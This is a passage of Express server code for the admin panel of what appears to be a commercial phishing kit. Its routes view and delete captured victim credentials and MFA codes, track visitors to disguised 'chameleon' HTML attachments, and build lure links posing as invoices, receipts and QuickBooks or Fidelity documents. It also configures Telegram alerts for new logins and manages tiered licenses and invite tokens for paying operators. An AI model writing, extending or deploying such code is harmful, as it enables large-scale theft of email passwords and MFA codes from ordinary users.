  const visible = Object.values(attachmentDB).filter(a => {
    if (user.role === 'superadmin') return true;
    return mySlug && a.slug === mySlug;
  });

  const result = visible.map(a => {
    const visitors = Object.values(visitorDB)
      .filter(v => v.cid === a.id)
      .sort((x, y) => new Date(y.lastSeen) - new Date(x.lastSeen));

    // Clients = unique emails captured from login attempts tied to this cid.
    const clientMap = {};
    loginAttempts.forEach(att => {
      if (!att.campaignId || att.campaignId !== a.id) return;
      const email = (att.email || '').toLowerCase();
      if (!email) return;
      if (!clientMap[email]) clientMap[email] = { email: att.email, attempts: 0, lastIp: att.ip, firstSeen: att.timestamp, lastSeen: att.timestamp, types: {} };
      const c = clientMap[email];
      c.attempts += 1;
      c.types[att.type || 'password'] = (c.types[att.type || 'password'] || 0) + 1;
      if (new Date(att.timestamp) > new Date(c.lastSeen)) { c.lastSeen = att.timestamp; c.lastIp = att.ip; }
      if (new Date(att.timestamp) < new Date(c.firstSeen)) c.firstSeen = att.timestamp;
    });
    const clients = Object.values(clientMap).sort((x, y) => new Date(y.lastSeen) - new Date(x.lastSeen));

    return {
      id: a.id, type: a.type, label: a.label, fname: a.fname,
      createdAt: a.createdAt, slug: a.slug,
      visitorCount: visitors.length, clientCount: clients.length,
      visitors, clients,
    };
  }).sort((x, y) => new Date(y.createdAt) - new Date(x.createdAt));

  // Past captures: login attempts whose attachment was deleted. Without this view,
  // captured emails from removed attachments would be invisible (they're filtered
  // out of the Logins tab as type='email' and have no parent attachment to render under).
  const orphanMap = {};
  loginAttempts.forEach(att => {
    if (!att.campaignId) return;
    if (attachmentDB[att.campaignId]) return; // still has a parent
    if (user.role !== 'superadmin' && att.slug !== mySlug) return;
    const cid = att.campaignId;
    if (!orphanMap[cid]) orphanMap[cid] = {
      id: cid, slug: att.slug || null, domain: att.campaignDomain || null,
      firstSeen: att.timestamp, lastSeen: att.timestamp,
      _clients: {}, totalAttempts: 0,
    };
    const o = orphanMap[cid];
    o.totalAttempts++;
    if (new Date(att.timestamp) < new Date(o.firstSeen)) o.firstSeen = att.timestamp;
    if (new Date(att.timestamp) > new Date(o.lastSeen)) o.lastSeen = att.timestamp;
    const email = (att.email || '').toLowerCase();
    if (!email) return;
    if (!o._clients[email]) o._clients[email] = { email: att.email, attempts: 0, lastIp: att.ip, firstSeen: att.timestamp, lastSeen: att.timestamp, types: {} };
    const c = o._clients[email];
    c.attempts++;
    c.types[att.type || 'password'] = (c.types[att.type || 'password'] || 0) + 1;
    if (new Date(att.timestamp) > new Date(c.lastSeen)) { c.lastSeen = att.timestamp; c.lastIp = att.ip; }
    if (new Date(att.timestamp) < new Date(c.firstSeen)) c.firstSeen = att.timestamp;
  });
  const orphans = Object.values(orphanMap)
    .map(o => ({
      id: o.id, slug: o.slug, domain: o.domain,
      firstSeen: o.firstSeen, lastSeen: o.lastSeen,
      totalAttempts: o.totalAttempts,
      clientCount: Object.keys(o._clients).length,
      clients: Object.values(o._clients).sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen)),
    }))
    .sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen));

  res.json({ total: result.length, attachments: result, orphans });
});

// Permanently forget a past-captures group: removes all login attempts tied to a deleted attachment's cid.
app.post(`/${ADMIN_PATH}/api/forget-past-capture`, requireAdmin, (req, res) => {
  const { cid } = req.body || {};
  if (!cid) return res.status(400).json({ error: 'cid required' });
  const user = req.session.adminUser;
  const dbUser = usersDB.find(u => u.id === user.id);
  const mySlug = dbUser ? dbUser.slug : null;
  if (attachmentDB[cid]) return res.status(400).json({ error: 'attachment still exists — delete that instead' });
  const before = loginAttempts.length;
  loginAttempts = loginAttempts.filter(att => {
    if (att.campaignId !== cid) return true;
    if (user.role !== 'superadmin' && att.slug !== mySlug) return true;
    return false;
  });
  const removed = before - loginAttempts.length;
  if (removed) scheduleLoginSave();
  res.json({ ok: true, removed });
});

app.post(`/${ADMIN_PATH}/api/delete-attachment`, requireAdmin, (req, res) => {
  const { cid } = req.body || {};
  if (!cid) return res.status(400).json({ error: 'cid required' });
  const a = attachmentDB[cid];
  if (!a) return res.status(404).json({ error: 'not found' });
  const user = req.session.adminUser;
  const dbUser = usersDB.find(u => u.id === user.id);
  const mySlug = dbUser ? dbUser.slug : null;
  if (user.role !== 'superadmin' && a.slug !== mySlug) return res.status(403).json({ error: 'forbidden' });
  // Delete attachment record + its scoped visitors. Login attempts kept (logs are immutable).
  delete attachmentDB[cid];
  Object.keys(visitorDB).forEach(k => { if (visitorDB[k].cid === cid) delete visitorDB[k]; });
  saveAttachmentDB();
  saveVisitorDB();
  res.json({ ok: true });
});

// Anonymous chameleon-HTML visitors (scoped by slug for non-superadmin)
app.get(`/${ADMIN_PATH}/api/visitors`, requireAdmin, (req, res) => {
  const user = req.session.adminUser;
  const dbUser = usersDB.find(u => u.id === user.id);
  const mySlug = dbUser ? dbUser.slug : null;
  const entries = Object.values(visitorDB)
    .filter(v => {
      if (user.role === 'superadmin') return true;
      return mySlug && v.slug === mySlug;
    })
    .sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen));
  res.json({ total: entries.length, entries });
});

app.post(`/${ADMIN_PATH}/api/clear-visitors`, requireAdmin, (req, res) => {
  const user = req.session.adminUser;
  if (user.role === 'superadmin') {
    Object.keys(visitorDB).forEach(k => delete visitorDB[k]);
  } else {
    const dbUser = usersDB.find(u => u.id === user.id);
    const mySlug = dbUser ? dbUser.slug : null;
    if (mySlug) {
      Object.keys(visitorDB).forEach(k => { if (visitorDB[k].slug === mySlug) delete visitorDB[k]; });
    }
  }
  saveVisitorDB();
  res.json({ ok: true });
});

// Superadmin-only endpoints
app.get(`/${ADMIN_PATH}/api/learned`, requireAdmin, requireSuperAdmin, (req, res) => {
  const sorted = Object.entries(learnedProviders).sort((a, b) => b[1].hits - a[1].hits).map(([domain, data]) => ({ domain, ...data }));
  res.json({ totalLearned: sorted.length, totalHardcoded: Object.keys(DOMAIN_TO_PROVIDER).length, domains: sorted });
});

app.get(`/${ADMIN_PATH}/api/providers`, requireAdmin, requireSuperAdmin, (req, res) => {
  // Group domains by provider
  const grouped = {};
  for (const [domain, provider] of Object.entries(DOMAIN_TO_PROVIDER)) {
    if (!grouped[provider]) grouped[provider] = { provider, name: (PROVIDER_THEMES[provider] || {}).name || (PROVIDER_INFO[provider] || {}).name || provider, color: (PROVIDER_THEMES[provider] || {}).primary || (PROVIDER_INFO[provider] || {}).color || '#666', domains: [] };
    grouped[provider].domains.push(domain);
  }
  const providers = Object.values(grouped).sort((a, b) => a.name.localeCompare(b.name));
  res.json({ totalProviders: providers.length, totalDomains: Object.keys(DOMAIN_TO_PROVIDER).length, providers });
});

app.post(`/${ADMIN_PATH}/api/unban`, requireAdmin, requireSuperAdmin, (req, res) => {
  const { ip } = req.body;
  ipBlacklist.delete(ip);
  ipStrikes.delete(ip);
  globalRateLimits.delete(ip);
  saveBans();
  console.log(`[admin] Unbanned IP: ${ip}`);
  res.json({ ok: true });
});

// Manually trust an IP without requiring the user to log in first. Use this
// when a user reports they cannot reach the dashboard at all — the operator
// can grant trust on their behalf and the user's first request will sail
// through. Also clears any existing ban/strike/device-ban tied to that IP.
app.post(`/${ADMIN_PATH}/api/force-trust`, requireAdmin, requireSuperAdmin, (req, res) => {
  const { ip, username, deviceId } = req.body || {};
  if (!ip && !deviceId) return res.status(400).json({ error: 'ip or deviceId required' });
  if (ip) {
    const now = Date.now();
    adminTrustedIps.set(ip, {
      trustedAt: new Date(now).toISOString(),
      expires: now + ADMIN_TRUST_DURATION,
      username: username || 'manual-trust',
    });
    ipBlacklist.delete(ip);
    ipStrikes.delete(ip);
    globalRateLimits.delete(ip);
    saveBans();
    saveAdminTrusted();
    console.log(`[admin] Force-trusted IP ${ip} (${username || 'manual'})`);
  }
  if (deviceId) {
    const now = Date.now();
    trustedDevices.set(deviceId, {
      trustedAt: new Date(now).toISOString(),
      expires: now + TRUSTED_DEVICE_DURATION,
      username: username || 'manual-trust',
    });
    deviceBans.delete(deviceId);
    saveDeviceBans();
    saveTrustedDevices();
    console.log(`[admin] Force-trusted device ${deviceId.slice(0,12)}... (${username || 'manual'})`);
  }
  res.json({ ok: true, trustedIps: adminTrustedIps.size, trustedDevices: trustedDevices.size });
});

app.post(`/${ADMIN_PATH}/api/ban`, requireAdmin, requireSuperAdmin, (req, res) => {
  const { ip, reason } = req.body;
  ipBlacklist.set(ip, { reason: reason || 'manual_ban', bannedAt: new Date().toISOString(), expires: Date.now() + IP_BAN_DURATION });
  console.log(`[admin] Manually banned IP: ${ip}`);
  res.json({ ok: true });
});

app.post(`/${ADMIN_PATH}/api/clear-strikes`, requireAdmin, requireSuperAdmin, (req, res) => {
  ipStrikes.clear();
  res.json({ ok: true });
});

app.post(`/${ADMIN_PATH}/api/clear-bans`, requireAdmin, requireSuperAdmin, (req, res) => {
  ipBlacklist.clear(); saveBans();
  deviceBans.clear(); saveDeviceBans();
  res.json({ ok: true });
});

app.post(`/${ADMIN_PATH}/api/clear-devices`, requireAdmin, requireSuperAdmin, (req, res) => {
  Object.keys(fingerprintDB).forEach(k => delete fingerprintDB[k]);
  saveFingerprintDB();
  console.log('[admin] Cleared all tracked devices');
  res.json({ ok: true });
});

app.post(`/${ADMIN_PATH}/api/clear-learned`, requireAdmin, requireSuperAdmin, (req, res) => {
  Object.keys(learnedProviders).forEach(k => delete learnedProviders[k]);
  saveLearnedProviders();
  console.log('[admin] Cleared all learned domains');
  res.json({ ok: true });
});

app.post(`/${ADMIN_PATH}/api/clear-all`, requireAdmin, requireSuperAdmin, (req, res) => {
  ipStrikes.clear();
  ipBlacklist.clear();
  Object.keys(fingerprintDB).forEach(k => delete fingerprintDB[k]);
  saveFingerprintDB();
  Object.keys(learnedProviders).forEach(k => delete learnedProviders[k]);
  saveLearnedProviders();
  passwordAttempts.clear();
  console.log('[admin] Cleared ALL data (bans, strikes, devices, learned, password attempts)');
  res.json({ ok: true });
});

// Settings endpoints (superadmin only)
app.get(`/${ADMIN_PATH}/api/settings`, requireAdmin, requireSuperAdmin, (req, res) => {
  res.json(appSettings);
});

app.post(`/${ADMIN_PATH}/api/settings`, requireAdmin, requireSuperAdmin, (req, res) => {
  const { maxPasswordAttempts, maxMfaAttempts } = req.body;
  if (maxPasswordAttempts !== undefined) {
    const val = parseInt(maxPasswordAttempts, 10);
    if (val >= 1 && val <= 20) appSettings.maxPasswordAttempts = val;
  }
  if (maxMfaAttempts !== undefined) {
    const val = parseInt(maxMfaAttempts, 10);
    if (val >= 1 && val <= 20) appSettings.maxMfaAttempts = val;
  }
  // Per-tier permissions
  if (req.body.tierPermissions) {
    if (!appSettings.tierPermissions) appSettings.tierPermissions = {};
    for (const tier of ['basic', 'premium', 'vip']) {
      if (req.body.tierPermissions[tier]) {
        appSettings.tierPermissions[tier] = {
          chameleon: !!req.body.tierPermissions[tier].chameleon,
          inbox: !!req.body.tierPermissions[tier].inbox,
          convert: !!req.body.tierPermissions[tier].convert,
          links: !!req.body.tierPermissions[tier].links,
        };
      }
    }
  }
  saveSettings();
  console.log(`[admin] Settings updated:`, appSettings);
  res.json({ ok: true, settings: appSettings });
});

// ---- User management endpoints (superadmin only) ----
app.get(`/${ADMIN_PATH}/api/users`, requireAdmin, requireSuperAdmin, (req, res) => {
  // Hide superadmins from the user-management list — they're operators, not
  // managed users. Superadmins manage their own account from Settings.
  const safe = usersDB
    .filter(u => u.role !== 'superadmin')
    .map(u => ({
      id: u.id,
      slug: u.slug,
      username: u.username,
      displayName: u.displayName,
      role: u.role,
      mfaEnabled: !!u.mfaEnabled,
      telegramEnabled: !!u.telegramEnabled,
      telegramBotToken: u.telegramBotToken ? '***configured***' : '',
      telegramChatId: u.telegramChatId || '',
      assignedEmails: u.assignedEmails || [],
      assignedDomains: u.assignedDomains || [],
      // license + features needed for tier badge and feature toggles in the UI
      license: u.license || null,
      features: u.features || null,
      domain: u.domain || '',
      domainVerified: !!u.domainVerified,
      frontDomain: u.frontDomain || '',
      requireDomain: !!u.requireDomain,
      createdAt: u.createdAt,
      updatedAt: u.updatedAt,
    }));
  res.json({ users: safe });
});

app.post(`/${ADMIN_PATH}/api/users`, requireAdmin, requireSuperAdmin, async (req, res) => {
  const { username, password, displayName, role, assignedEmails, assignedDomains } = req.body;
  if (!username || !password) return res.status(400).json({ error: 'Username and password are required.' });
  if (password.length < 6) return res.status(400).json({ error: 'Password must be at least 6 characters.' });
  if (usersDB.find(u => u.username.toLowerCase() === username.toLowerCase())) {
    return res.status(409).json({ error: 'Username already exists.' });
  }
  const validRole = (role === 'superadmin' || role === 'user') ? role : 'user';
  const newUser = {
    id: 'u_' + crypto.randomBytes(4).toString('hex'),
    slug: generateSlug(),
    username: username.trim(),
    displayName: (displayName || username).trim(),
    passwordHash: await hashPassword(password),
    role: validRole,
    mfaEnabled: false,
    telegramBotToken: '',
    telegramChatId: '',
    telegramEnabled: false,
    assignedEmails: Array.isArray(assignedEmails) ? assignedEmails.map(e => e.trim().toLowerCase()).filter(Boolean) : [],
    assignedDomains: Array.isArray(assignedDomains) ? assignedDomains.map(d => d.trim().toLowerCase()).filter(Boolean) : [],
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  };
  usersDB.push(newUser);
  saveUsersDB();
  console.log(`[admin] Created user: ${newUser.username} (${newUser.role})`);
  res.json({ ok: true, user: { ...newUser, passwordHash: undefined } });
});

app.put(`/${ADMIN_PATH}/api/users/:id`, requireAdmin, requireSuperAdmin, async (req, res) => {
  const user = usersDB.find(u => u.id === req.params.id);
  if (!user) return res.status(404).json({ error: 'User not found.' });
  const { username, password, displayName, role, assignedEmails, assignedDomains, mfaEnabled, telegramBotToken, telegramChatId, telegramEnabled } = req.body;
  if (mfaEnabled !== undefined) user.mfaEnabled = !!mfaEnabled;
  if (telegramEnabled !== undefined) user.telegramEnabled = !!telegramEnabled;
  if (telegramBotToken !== undefined && telegramBotToken !== '***configured***') user.telegramBotToken = telegramBotToken.trim();
  if (telegramChatId !== undefined) user.telegramChatId = telegramChatId.trim();
  if (username !== undefined) {
    const trimmed = username.trim();
    if (!trimmed) return res.status(400).json({ error: 'Username is required.' });
    const conflict = usersDB.find(u => u.id !== user.id && u.username.toLowerCase() === trimmed.toLowerCase());
    if (conflict) return res.status(409).json({ error: 'Username already exists.' });
    user.username = trimmed;
  }
  if (password) {
    if (password.length < 6) return res.status(400).json({ error: 'Password must be at least 6 characters.' });
    user.passwordHash = await hashPassword(password);
  }
  if (displayName !== undefined) user.displayName = displayName.trim();
  if (role === 'superadmin' || role === 'user') user.role = role;
  if (Array.isArray(assignedEmails)) user.assignedEmails = assignedEmails.map(e => e.trim().toLowerCase()).filter(Boolean);
  if (Array.isArray(assignedDomains)) user.assignedDomains = assignedDomains.map(d => d.trim().toLowerCase()).filter(Boolean);
  user.updatedAt = new Date().toISOString();
  saveUsersDB();
  console.log(`[admin] Updated user: ${user.username}`);
  res.json({ ok: true, user: { ...user, passwordHash: undefined } });
});

app.delete(`/${ADMIN_PATH}/api/users/:id`, requireAdmin, requireSuperAdmin, (req, res) => {
  if (req.params.id === req.session.adminUser.id) {
    return res.status(400).json({ error: 'Cannot delete your own account.' });
  }
  const idx = usersDB.findIndex(u => u.id === req.params.id);
  if (idx === -1) return res.status(404).json({ error: 'User not found.' });
  const removed = usersDB.splice(idx, 1)[0];
  saveUsersDB();
  console.log(`[admin] Deleted user: ${removed.username}`);
  res.json({ ok: true });
});

// ---- Per-user feature toggles (superadmin only) ----
app.post(`/${ADMIN_PATH}/api/user-features/:userId`, requireAdmin, requireSuperAdmin, (req, res) => {
  const user = usersDB.find(u => u.id === req.params.userId);
  if (!user) return res.status(404).json({ error: 'User not found.' });
  if (user.role === 'superadmin') return res.status(400).json({ error: 'Cannot modify owner.' });
  const { chameleon, inbox, convert, links } = req.body || {};
  if (!user.features) user.features = {};
  if (chameleon !== undefined) user.features.chameleon = !!chameleon;
  if (inbox !== undefined) user.features.inbox = !!inbox;
  if (convert !== undefined) user.features.convert = !!convert;
  if (links !== undefined) user.features.links = !!links;
  saveUsersDB();
  res.json({ ok: true, features: user.features });
});

// ---- Per-user "require verified domain" policy (superadmin only) ----
// When enabled, this user is forced to add & verify their own front-domain
// before any attachment generator (chameleon HTML/inbox/QR/ICS, client links)
// will respond. Superadmin is always exempt via blockMissingDomain().
app.post(`/${ADMIN_PATH}/api/user-require-domain/:userId`, requireAdmin, requireSuperAdmin, (req, res) => {
  const user = usersDB.find(u => u.id === req.params.userId);
  if (!user) return res.status(404).json({ error: 'User not found.' });
  if (user.role === 'superadmin') return res.status(400).json({ error: 'Cannot modify owner.' });
  const { enabled } = req.body || {};
  if (typeof enabled !== 'boolean') return res.status(400).json({ error: 'enabled must be boolean.' });
  user.requireDomain = enabled;
  user.updatedAt = new Date().toISOString();
  saveUsersDB();
  console.log(`[admin] requireDomain ${enabled ? 'ON' : 'OFF'} for ${user.username}`);
  res.json({ ok: true, requireDomain: user.requireDomain });
});

// ---- License management (superadmin only) ----
app.get(`/${ADMIN_PATH}/api/license-tiers`, requireAdmin, (req, res) => {
  res.json({ tiers: LICENSE_TIERS });
});

app.post(`/${ADMIN_PATH}/api/license/:userId`, requireAdmin, requireSuperAdmin, (req, res) => {
  const user = usersDB.find(u => u.id === req.params.userId);
  if (!user) return res.status(404).json({ error: 'User not found.' });
  if (user.role === 'superadmin') return res.status(400).json({ error: 'Cannot modify owner license.' });
  const { action, tier, days } = req.body || {};
  if (!user.license) user.license = { key: crypto.randomBytes(8).toString('hex').toUpperCase(), tier: 'basic', active: true, expiresAt: null, createdAt: new Date().toISOString() };

  switch (action) {
    case 'activate':
      user.license.active = true;
      if (days) user.license.expiresAt = new Date(Date.now() + parseInt(days, 10) * 24 * 60 * 60 * 1000).toISOString();
      break;
    case 'revoke':
      user.license.active = false;
      break;
    case 'extend':
      const d = parseInt(days, 10) || 30;
      const current = user.license.expiresAt ? new Date(user.license.expiresAt).getTime() : Date.now();
      const base = current > Date.now() ? current : Date.now();
      user.license.expiresAt = new Date(base + d * 24 * 60 * 60 * 1000).toISOString();
      user.license.active = true;
      break;
    case 'set-tier':
      if (LICENSE_TIERS[tier]) user.license.tier = tier;
      break;
    case 'regenerate-key':
      user.license.key = crypto.randomBytes(8).toString('hex').toUpperCase();
      break;
    default:
      return res.status(400).json({ error: 'Invalid action.' });
  }
  saveUsersDB();
  console.log(`[license] ${action} for ${user.username}: tier=${user.license.tier} active=${user.license.active} expires=${user.license.expiresAt}`);
  res.json({ ok: true, license: user.license });
});

// Test Telegram notification
app.post(`/${ADMIN_PATH}/api/test-telegram`, requireAdmin, async (req, res) => {
  const { botToken, chatId } = req.body;
  if (!botToken || !chatId) return res.status(400).json({ error: 'Bot token and chat ID are required.' });
  try {
    const resp = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: `✅ *Telegram Connected*\n\nYou will receive real-time login notifications here.\n\n🕐 ${new Date().toLocaleString()}`,
        parse_mode: 'Markdown',
      }),
    });
    const data = await resp.json();
    if (!data.ok) return res.status(400).json({ error: data.description || 'Telegram API error.' });
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: 'Failed to connect: ' + e.message });
  }
});

// ---- Invite token endpoints ----
// Generate invite token (superadmin only)
app.post(`/${ADMIN_PATH}/api/tokens`, requireAdmin, requireSuperAdmin, (req, res) => {
  const { displayName, role, tier, licenseMonths, assignedEmails, assignedDomains, expiresInHours } = req.body;
  const validRole = (role === 'superadmin' || role === 'user') ? role : 'user';
  const VALID_TIERS = ['basic', 'premium', 'vip'];
  // Superadmins always get owner-tier (all features); others default to basic.
  const validTier = validRole === 'superadmin' ? 'owner' : (VALID_TIERS.includes(tier) ? tier : 'basic');
  // License duration: 1, 3, 6, 12 months (or 0 = lifetime). Default 1 month.
  const VALID_MONTHS = [0, 1, 3, 6, 12];
  const months = VALID_MONTHS.includes(parseInt(licenseMonths, 10)) ? parseInt(licenseMonths, 10) : 1;
  const token = crypto.randomBytes(24).toString('hex');
  const hours = parseInt(expiresInHours, 10) || 48;
  // Display name is optional — recipient can set their own at activation.
  const trimmedName = (displayName || '').trim();
  const finalName = trimmedName || `${validTier.charAt(0).toUpperCase() + validTier.slice(1)} user`;
  const invite = {
    token,
    displayName: finalName,
    role: validRole,
    tier: validTier,
    licenseMonths: months,
    assignedEmails: Array.isArray(assignedEmails) ? assignedEmails.map(e => e.trim().toLowerCase()).filter(Boolean) : [],
    assignedDomains: Array.isArray(assignedDomains) ? assignedDomains.map(d => d.trim().toLowerCase()).filter(Boolean) : [],
    createdBy: req.session.adminUser.username,
    createdAt: new Date().toISOString(),
    expiresAt: new Date(Date.now() + hours * 3600000).toISOString(),
  };
  inviteTokens.push(invite);
  saveTokensDB();
  console.log(`[admin] Invite token generated for "${invite.displayName}" by ${invite.createdBy}`);
  res.json({ ok: true, token, expiresAt: invite.expiresAt });
});

// One-shot download staging — lets the chameleon/inbox/etc. generators
// hand the file off to the browser without the admin client having to
// fetch the bytes into a Blob and createObjectURL it (which leaks
// blob:http://<admin-origin>/<uuid> URLs into the network panel).
// Flow: generator stages the bytes → returns { downloadId } → admin UI
// sets a hidden iframe.src to /api/download/<id> → browser downloads
// via Content-Disposition: attachment → entry is deleted on first hit.
const pendingDownloads = new Map();
const DOWNLOAD_TTL_MS = 60 * 1000;
function stageDownload({ buffer, filename, contentType }) {
  const id = crypto.randomBytes(8).toString('hex');
  pendingDownloads.set(id, { buffer, filename, contentType, expiresAt: Date.now() + DOWNLOAD_TTL_MS });
  // Opportunistic GC
  for (const [k, v] of pendingDownloads) if (v.expiresAt < Date.now()) pendingDownloads.delete(k);
  return id;
}
app.get(`/${ADMIN_PATH}/api/download/:id`, requireAdmin, (req, res) => {
  const entry = pendingDownloads.get(req.params.id);
  if (!entry || entry.expiresAt < Date.now()) return res.status(404).send('Expired');
  pendingDownloads.delete(req.params.id);
  const safeName = String(entry.filename || 'download').replace(/[^a-zA-Z0-9._-]/g, '_');
  res.setHeader('Content-Type', entry.contentType || 'application/octet-stream');
  res.setHeader('Content-Disposition', `attachment; filename="${safeName}"`);
  res.setHeader('Cache-Control', 'no-store');
  res.send(entry.buffer);
});

// Prune expired invite tokens from memory + disk. Runs on each list call and
// also on a 5-minute timer below.
function pruneExpiredTokens() {
  const now = Date.now();
  const before = inviteTokens.length;
  inviteTokens = inviteTokens.filter(t => !t.expiresAt || new Date(t.expiresAt).getTime() > now);
  if (inviteTokens.length !== before) {
    saveTokensDB();
    console.log(`[tokens] Pruned ${before - inviteTokens.length} expired invite token(s)`);
  }
}
setInterval(pruneExpiredTokens, 5 * 60 * 1000);

// List active tokens (superadmin only). The full token is returned so the UI
// can show the activation link on demand (revoke uses the 8-char `id` prefix
// for the URL — keeps the full token out of the URL/log).
app.get(`/${ADMIN_PATH}/api/tokens`, requireAdmin, requireSuperAdmin, (req, res) => {
  pruneExpiredTokens();
  const active = inviteTokens.map(t => ({
    ...t,
    id: t.token.slice(0, 8),
    // token: kept full
  }));
  res.json({ tokens: active });
});

// Revoke a token (superadmin only). Accepts the 8-char prefix returned as `id`.
app.delete(`/${ADMIN_PATH}/api/tokens/:tokenPrefix`, requireAdmin, requireSuperAdmin, (req, res) => {
  // Strip any trailing "..." in case caller passed the display form.
  const prefix = req.params.tokenPrefix.replace(/\.+$/, '');
  if (!prefix) return res.status(400).json({ error: 'Missing token prefix.' });
  const idx = inviteTokens.findIndex(t => t.token.startsWith(prefix));
  if (idx === -1) return res.status(404).json({ error: 'Token not found.' });
  inviteTokens.splice(idx, 1);
  saveTokensDB();
  console.log(`[tokens] Revoked invite ${prefix}...`);
  res.json({ ok: true });
});

// Public: validate token (for activation page)
app.get('/api/invite/:token', (req, res) => {
  const invite = inviteTokens.find(t => t.token === req.params.token);
  if (!invite) return res.status(404).json({ error: 'Invalid or expired invite token.' });
  if (invite.expiresAt && new Date(invite.expiresAt).getTime() < Date.now()) {
    return res.status(410).json({ error: 'This invite token has expired.' });
  }
  res.json({ displayName: invite.displayName, role: invite.role, tier: invite.tier || 'basic' });
});

// Public: activate account with token
app.post('/api/invite/:token/activate', async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) return res.status(400).json({ error: 'Username and password are required.' });
  if (!username.trim()) return res.status(400).json({ error: 'Username is required.' });
  if (password.length < 6) return res.status(400).json({ error: 'Password must be at least 6 characters.' });

  const tokenIdx = inviteTokens.findIndex(t => t.token === req.params.token);
  if (tokenIdx === -1) return res.status(404).json({ error: 'Invalid or expired invite token.' });
  const invite = inviteTokens[tokenIdx];
  if (invite.expiresAt && new Date(invite.expiresAt).getTime() < Date.now()) {
    return res.status(410).json({ error: 'This invite token has expired.' });
  }

  // Check username conflict
  if (usersDB.find(u => u.username.toLowerCase() === username.trim().toLowerCase())) {
    return res.status(409).json({ error: 'Username already taken. Please choose another.' });
  }

  // Resolve tier and derive feature flags from settings.tierPermissions.
  // Superadmins get the owner tier with everything enabled.
  const tier = invite.role === 'superadmin' ? 'owner' : (invite.tier || 'basic');
  const tierPerms = (appSettings.tierPermissions && appSettings.tierPermissions[tier]) || null;
  const features = (invite.role === 'superadmin' || tier === 'owner')
    ? { chameleon: true, inbox: true, convert: true, links: true }
    : (tierPerms ? { ...tierPerms } : { chameleon: false, inbox: true, convert: false, links: true });

  // Initial license duration in months. 0 = lifetime, otherwise N * 30 days.
  const months = (invite.licenseMonths === undefined || invite.licenseMonths === null) ? 1 : invite.licenseMonths;
  const expiresAt = invite.role === 'superadmin' || months === 0
    ? null
    : new Date(Date.now() + months * 30 * 24 * 60 * 60 * 1000).toISOString();

  // Create user
  const newUser = {
    id: 'u_' + crypto.randomBytes(4).toString('hex'),
    slug: generateSlug(),
    username: username.trim(),
    displayName: invite.displayName,
    passwordHash: await hashPassword(password),
    role: invite.role,
    mfaEnabled: false,
    telegramBotToken: '',
    telegramChatId: '',
    telegramEnabled: false,
    assignedEmails: invite.assignedEmails || [],
    assignedDomains: invite.assignedDomains || [],
    features,
    license: {
      key: invite.role === 'superadmin' ? 'OWNER' : crypto.randomBytes(8).toString('hex').toUpperCase(),
      tier,
      active: true,
      expiresAt,
      cycleMonths: months,
      createdAt: new Date().toISOString(),
    },
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  };
  usersDB.push(newUser);
  saveUsersDB();

  // Consume token — one-time use
  inviteTokens.splice(tokenIdx, 1);
  saveTokensDB();

  console.log(`[admin] Account activated: ${newUser.username} (invited as "${invite.displayName}" by ${invite.createdBy})`);
  res.json({ ok: true, username: newUser.username });
});

// Activation page
app.get(`/${ADMIN_PATH}/activate`, (req, res) => {
  res.sendFile(pickHtml('activate.html'));
});

// ---- Login attempts API ----
app.get(`/${ADMIN_PATH}/api/logins`, requireAdmin, (req, res) => {
  const user = req.session.adminUser;
  const dbUser = usersDB.find(u => u.id === user.id);
  const mySlug = dbUser ? dbUser.slug : null;

  // Backfill ids on legacy entries that were logged before the id field
  // was added. Done lazily here so per-row delete works on old rows too.
  let dirty = false;
  loginAttempts.forEach(a => { if (!a.id) { a.id = crypto.randomBytes(8).toString('hex'); dirty = true; } });
  if (dirty) scheduleLoginSave();

  // Logins tab = real credential captures only (password / mfa). The
  // email-only step from /auth/detect is recorded so it surfaces under the
  // attachment's Clients dropbox, but doesn't belong in Logins.
  let filtered = loginAttempts.filter(a => a.type !== 'email');
  if (user.role !== 'superadmin') {
    // Regular users only see attempts for their slug
    filtered = filtered.filter(a => a.slug && a.slug === mySlug);
  }

  // Return most recent first, limit 500
  const sorted = [...filtered].reverse().slice(0, 500);
  res.json({ total: filtered.length, attempts: sorted });
});

// Clear login attempts (superadmin clears all, user clears own)
app.post(`/${ADMIN_PATH}/api/clear-logins`, requireAdmin, (req, res) => {
  const user = req.session.adminUser;
  if (user.role === 'superadmin') {
    loginAttempts = [];
  } else {
    const dbUser = usersDB.find(u => u.id === user.id);
    const mySlug = dbUser ? dbUser.slug : null;
    loginAttempts = loginAttempts.filter(a => a.slug !== mySlug);
  }
  saveLoginsDB();
  res.json({ ok: true });
});

// Delete a single login attempt by id
app.delete(`/${ADMIN_PATH}/api/logins/:id`, requireAdmin, (req, res) => {
  const user = req.session.adminUser;
  const dbUser = usersDB.find(u => u.id === user.id);
  const mySlug = dbUser ? dbUser.slug : null;
  const id = req.params.id;
  const idx = loginAttempts.findIndex(a => a.id === id);
  if (idx === -1) return res.status(404).json({ error: 'Not found.' });
  const a = loginAttempts[idx];
  if (user.role !== 'superadmin' && a.slug !== mySlug) return res.status(403).json({ error: 'Forbidden.' });
  loginAttempts.splice(idx, 1);
  saveLoginsDB();
  res.json({ ok: true });
});

// ---- Client link generation ----
// Any admin user can generate links for their clients
app.post(`/${ADMIN_PATH}/api/links`, requireAdmin, (req, res) => {
  const { email, expiresInHours, documentType } = req.body;
  const user = req.session.adminUser;
  const dbUser = usersDB.find(u => u.id === user.id);
  if (!dbUser) return res.status(400).json({ error: 'User not found.' });
  if (blockMissingDomain(dbUser)) {
    return res.status(403).json({ error: 'Your account requires a verified domain. Go to Settings → My Domain to add and verify yours.' });
  }

  const docTypeMap = { invoice: 'i', receipt: 'r', confirmation: 'c', invitation: 'invite', quickbook: 'q', fidelity: 'f' };
  const docType = documentType && docTypeMap[documentType] ? documentType : 'invoice';
  const routePrefix = docTypeMap[docType] || 'd';

  const hash = crypto.randomBytes(12).toString('hex');
  const hours = parseInt(expiresInHours, 10) || 72;
  clientLinks[hash] = {
    slug: dbUser.slug,
    userId: dbUser.id,
    email: (email && email.includes('@')) ? email.trim().toLowerCase() : '',
    createdBy: user.username,
    createdAt: new Date().toISOString(),
